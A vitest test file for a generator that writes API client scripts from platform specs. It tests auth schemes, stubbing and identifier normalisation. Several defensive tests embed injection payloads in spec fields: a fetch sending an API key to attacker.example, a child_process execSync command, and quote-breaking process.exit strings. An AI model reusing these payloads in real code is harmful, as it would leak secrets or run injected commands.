import { describe, expect, it } from "vitest";
import type { Endpoint, PlatformUnderstanding } from "@scout/types";
import {
  envExampleFor,
  envVarName,
  generateCode,
  stepMentionsEndpoint,
  toIdentifier,
  UnknownWorkflowError,
  type GenerateCodePlatform,
} from "./generate-code.js";

function fakeUnderstanding(overrides: Partial<PlatformUnderstanding> = {}): PlatformUnderstanding {
  return {
    platformId: "00000000-0000-0000-0000-000000000000",
    summary: "s",
    architectureOverview: "a",
    authenticationFlow: "auth",
    dataModel: [],
    entityRelationships: [],
    commonWorkflows: [{ name: "List widgets", steps: ["Call GET /widgets to list all widgets"] }],
    integrationOpportunities: [],
    potentialPitfalls: [],
    missingDocumentation: [],
    securityObservations: [],
    mermaidSequenceDiagram: "sequenceDiagram",
    mermaidErDiagram: "erDiagram",
    citations: [],
    generatedAt: new Date().toISOString(),
    ...overrides,
  };
}

function fakeEndpoint(overrides: Partial<Endpoint> = {}): Endpoint {
  return {
    id: "00000000-0000-0000-0000-000000000001",
    platformId: "00000000-0000-0000-0000-000000000000",
    group: "widgets",
    method: "GET",
    path: "/widgets",
    summary: "List widgets",
    description: null,
    parameters: [],
    requestBodySchema: null,
    responseSchema: null,
    exampleRequest: null,
    exampleResponse: null,
    ...overrides,
  };
}

function fakePlatform(overrides: Partial<GenerateCodePlatform> = {}): GenerateCodePlatform {
  return {
    name: "Widget API",
    slug: "widget-api",
    baseUrl: "https://api.widgets.test",
    authScheme: "api_key_header",
    ...overrides,
  };
}

describe("generateCode", () => {
  it("generates a real, syntax-validated TypeScript script for API-key-header auth", async () => {
    const result = await generateCode(fakeUnderstanding(), [fakeEndpoint()], fakePlatform(), { lang: "ts" });
    expect(result.isStub).toBe(false);
    expect(result.workflowUsed).toBe("List widgets");
    expect(result.code).toContain("WIDGET_API_API_KEY");
    expect(result.code).toContain("https://api.widgets.test/widgets");
    expect(result.code).toContain('method: "GET"');
    expect(result.syntaxValidated).toBe(true);
    expect(result.syntaxValidationNote).toBeUndefined();
  }, 10000);

  it("generates a real TypeScript script for API-key-query auth, appending the key as a query param", async () => {
    const platform = fakePlatform({ authScheme: "api_key_query" });
    const result = await generateCode(fakeUnderstanding(), [fakeEndpoint()], platform, { lang: "ts" });
    expect(result.isStub).toBe(false);
    expect(result.code).toContain('url += (url.includes("?") ? "&" : "?") + `api_key=${apiKey}`');
    expect(result.code).not.toContain("headers:");
    expect(result.syntaxValidated).toBe(true);
  }, 10000);

  it("generates a real, syntax-validated Python script for API-key-query auth, using requests' params", async () => {
    const platform = fakePlatform({ authScheme: "api_key_query" });
    const result = await generateCode(fakeUnderstanding(), [fakeEndpoint()], platform, { lang: "py" });
    expect(result.isStub).toBe(false);
    expect(result.code).toContain('params={"api_key": api_key}');
    expect(result.code).not.toContain("headers=");
    expect(result.syntaxValidated).toBe(true);
  }, 10000);

  it("generates a real, syntax-validated Python script for Bearer-token auth", async () => {
    const platform = fakePlatform({ authScheme: "bearer_token" });
    const result = await generateCode(fakeUnderstanding(), [fakeEndpoint()], platform, { lang: "py" });
    expect(result.isStub).toBe(false);
    expect(result.code).toContain("import requests");
    expect(result.code).toContain("Bearer {api_key}");
    expect(result.syntaxValidated).toBe(true);
  }, 10000);

  it("stubs when there are no endpoints, and does not attempt syntax validation on a stub", async () => {
    const result = await generateCode(fakeUnderstanding(), [], fakePlatform(), { lang: "ts" });
    expect(result.isStub).toBe(true);
    expect(result.stubReason).toBe("no-endpoints-available");
    expect(result.syntaxValidated).toBe(false);
  });

  it("stubs for an out-of-taxonomy auth scheme instead of fabricating a working script", async () => {
    const platform = fakePlatform({ authScheme: "oauth2" });
    const result = await generateCode(fakeUnderstanding(), [fakeEndpoint()], platform, { lang: "ts" });
    expect(result.isStub).toBe(true);
    expect(result.stubReason).toBe("unsupported-auth-scheme:oauth2");
  });

  it("stubs when only write endpoints exist, rather than fabricating request body values", async () => {
    const writeOnly = [fakeEndpoint({ method: "POST", path: "/widgets" })];
    const result = await generateCode(fakeUnderstanding(), writeOnly, fakePlatform(), { lang: "ts" });
    expect(result.isStub).toBe(true);
    expect(result.stubReason).toBe("no-read-endpoint-available");
  });

  it("throws UnknownWorkflowError with valid names when --workflow doesn't match", async () => {
    await expect(
      generateCode(fakeUnderstanding(), [fakeEndpoint()], fakePlatform(), { lang: "ts", workflow: "nope" }),
    ).rejects.toThrow(UnknownWorkflowError);
  });

  it("flags workflowMismatch and adds an honest note when the targeted workflow is write-only and the code falls back to an unrelated GET", async () => {
    const understanding = fakeUnderstanding({
      commonWorkflows: [{ name: "Create a widget", steps: ["POST /widgets with a JSON body"] }],
    });
    const endpoints = [fakeEndpoint({ method: "GET", path: "/widgets", summary: "List widgets" })];
    const result = await generateCode(understanding, endpoints, fakePlatform(), { lang: "ts", workflow: "Create a widget" });

    expect(result.isStub).toBe(false);
    expect(result.workflowUsed).toBe("Create a widget");
    expect(result.workflowMismatch).toBe(true);
    expect(result.code).toContain("don't mention this call");
    expect(result.code).toContain("GET /widgets");
  }, 10000);

  it("does not flag workflowMismatch when the targeted workflow's steps do mention the selected GET endpoint", async () => {
    const understanding = fakeUnderstanding({
      commonWorkflows: [{ name: "List widgets", steps: ["Call GET /widgets to list all widgets"] }],
    });
    const result = await generateCode(understanding, [fakeEndpoint()], fakePlatform(), { lang: "ts", workflow: "List widgets" });

    expect(result.workflowMismatch).toBe(false);
    expect(result.code).not.toContain("don't mention this call");
  }, 10000);

  it("does not flag workflowMismatch when no workflow is targeted at all", async () => {
    const understanding = fakeUnderstanding({ commonWorkflows: [] });
    const result = await generateCode(understanding, [fakeEndpoint()], fakePlatform(), { lang: "ts" });

    expect(result.workflowUsed).toBeNull();
    expect(result.workflowMismatch).toBe(false);
  }, 10000);

  it("normalizes dashed and reserved-word field names into valid identifiers, in a comment (not TS-only interface syntax, so it still validates as plain JS)", async () => {
    const endpoint = fakeEndpoint({
      responseSchema: { properties: { "first-name": {}, class: {}, id: {} } },
    });
    const result = await generateCode(fakeUnderstanding(), [endpoint], fakePlatform(), { lang: "ts" });
    expect(result.code).toContain('first_name (raw field: "first-name")');
    expect(result.code).toContain('class_ (raw field: "class")');
    expect(result.code).toContain(", id");
    expect(result.code).not.toContain("interface");
    expect(result.syntaxValidated).toBe(true);
  }, 10000);

  it("substitutes required path parameters with a fill-in placeholder, not a fabricated value", async () => {
    const endpoint = fakeEndpoint({
      path: "/widgets/{id}",
      parameters: [{ name: "id", in: "path", required: true, type: "string", description: null }],
    });
    const result = await generateCode(fakeUnderstanding(), [endpoint], fakePlatform(), { lang: "ts" });
    expect(result.code).toContain('url.replace("{id}", "<ID>")');
    expect(result.syntaxValidated).toBe(true);
  }, 10000);

  it("does not let a newline in the spec's platform name break out of the header comment into live code", async () => {
    const malicious = 'Evil API\nfetch("https://attacker.example/exfil?k=" + process.env.EVIL_API_KEY);\n//';
    const platform = fakePlatform({ name: malicious });
    const result = await generateCode(fakeUnderstanding(), [fakeEndpoint()], platform, { lang: "ts" });
    // The security property: the injected statement must never become its own
    // bare, executable line -- only ever text inside the single-line comment.
    expect(result.code.split("\n")).not.toContain('fetch("https://attacker.example/exfil?k=" + process.env.EVIL_API_KEY);');
    expect(result.code.split("\n")[0]).toMatch(/^\/\/ Generated by Scout from the "Evil API fetch/);
    expect(result.syntaxValidated).toBe(true);
  }, 10000);

  it("does not let a newline in an LLM-synthesized workflow name break out of a comment", async () => {
    const malicious = 'Nice workflow\nrequire("child_process").execSync("touch /tmp/pwned");\n//';
    const understanding = fakeUnderstanding({ commonWorkflows: [{ name: malicious, steps: ["Call GET /widgets"] }] });
    const result = await generateCode(understanding, [fakeEndpoint()], fakePlatform(), { lang: "ts" });
    expect(result.code.split("\n")).not.toContain('require("child_process").execSync("touch /tmp/pwned");');
  }, 10000);

  it("does not let a newline or quote in a spec-derived response field name break out of its comment", async () => {
    const endpoint = fakeEndpoint({
      responseSchema: { properties: { 'id"\nconsole.log("pwned")': {} } },
    });
    const result = await generateCode(fakeUnderstanding(), [endpoint], fakePlatform(), { lang: "ts" });
    expect(result.code.split("\n")).not.toContain('console.log("pwned")');
  }, 10000);

  it("escapes quotes/newlines in the spec's base URL and endpoint path before embedding them in the generated string literal", async () => {
    const platform = fakePlatform({ baseUrl: 'https://api.test"; process.exit(1); //' });
    const result = await generateCode(fakeUnderstanding(), [fakeEndpoint()], platform, { lang: "ts" });
    // Escaped correctly: the injected quote stays backslash-escaped (inert string
    // content), never terminates the string literal early.
    expect(result.code).toContain('let url = "https://api.test\\"; process.exit(1); //widgets";');
    expect(result.syntaxValidated).toBe(true);
  }, 10000);

  it("escapes a malicious path-parameter name before embedding it in the generated string literal and comment", async () => {
    const endpoint = fakeEndpoint({
      path: "/widgets/{evil}",
      parameters: [{ name: 'evil"); process.exit(1); //', in: "path", required: true, type: "string", description: null }],
    });
    const result = await generateCode(fakeUnderstanding(), [endpoint], fakePlatform(), { lang: "ts" });
    expect(result.code.split("\n")).not.toContain('process.exit(1);');
    expect(result.syntaxValidated).toBe(true);
  }, 10000);

  it("extracts real field names from an array-of-objects response schema instead of showing 'type'/'items'", async () => {
    const endpoint = fakeEndpoint({
      responseSchema: { type: "array", items: { properties: { id: {}, name: {} } } },
    });
    const result = await generateCode(fakeUnderstanding(), [endpoint], fakePlatform(), { lang: "ts" });
    expect(result.code).toContain("id, name");
    expect(result.code).not.toContain("expected response fields\n// type");
  }, 10000);

  it("does not fabricate field names from an unresolved $ref (no properties visible)", async () => {
    const endpoint = fakeEndpoint({
      responseSchema: { $ref: "#/components/schemas/Widget" },
    });
    const result = await generateCode(fakeUnderstanding(), [endpoint], fakePlatform(), { lang: "ts" });
    expect(result.code).not.toContain("$ref");
    expect(result.code).not.toContain("expected response fields");
  }, 10000);

  it("does not fabricate field names from a schema whose only keys are JSON-Schema metadata", async () => {
    const endpoint = fakeEndpoint({
      responseSchema: { type: "object", description: "a widget", additionalProperties: false },
    });
    const result = await generateCode(fakeUnderstanding(), [endpoint], fakePlatform(), { lang: "ts" });
    expect(result.code).not.toContain("expected response fields");
  }, 10000);

  it("includes a .env.example for a real script but not for a stub", async () => {
    const real = await generateCode(fakeUnderstanding(), [fakeEndpoint()], fakePlatform(), { lang: "ts" });
    expect(real.envExample).toBe("# Widget API -- generated by `scout generate`\nWIDGET_API_API_KEY=\n");

    const stubbed = await generateCode(fakeUnderstanding(), [], fakePlatform(), { lang: "ts" });
    expect(stubbed.envExample).toBeUndefined();
  }, 10000);
});

describe("envExampleFor", () => {
  it("names the right env var for the platform's slug", () => {
    expect(envExampleFor({ name: "Stripe API", slug: "stripe", baseUrl: null, authScheme: null })).toBe(
      "# Stripe API -- generated by `scout generate`\nSTRIPE_API_KEY=\n",
    );
  });

  it("strips a newline from the platform name so it can't inject an extra line", () => {
    const result = envExampleFor({ name: "Evil\nFAKE_KEY=leaked", slug: "evil", baseUrl: null, authScheme: null });
    expect(result).toBe("# Evil FAKE_KEY=leaked -- generated by `scout generate`\nEVIL_API_KEY=\n");
  });
});

describe("envVarName", () => {
  it("normalizes a slug into SCREAMING_SNAKE_CASE plus _API_KEY", () => {
    expect(envVarName("stripe")).toBe("STRIPE_API_KEY");
    expect(envVarName("hubspot-contacts")).toBe("HUBSPOT_CONTACTS_API_KEY");
  });
});

describe("stepMentionsEndpoint", () => {
  it("does not false-positive on a method name embedded inside an unrelated word (e.g. \"get\" inside \"widgets\")", () => {
    const endpoint = fakeEndpoint({ method: "GET", path: "/widgets" });
    expect(stepMentionsEndpoint("POST /widgets with a JSON body", endpoint)).toBe(false);
  });

  it("still matches a real, word-boundary method mention", () => {
    const endpoint = fakeEndpoint({ method: "GET", path: "/widgets" });
    expect(stepMentionsEndpoint("Call GET /widgets to list all widgets", endpoint)).toBe(true);
  });
});

describe("toIdentifier", () => {
  it("handles dashes, leading digits, and reserved words", () => {
    expect(toIdentifier("first-name")).toBe("first_name");
    expect(toIdentifier("2fa")).toBe("_2fa");
    expect(toIdentifier("class")).toBe("class_");
  });
});
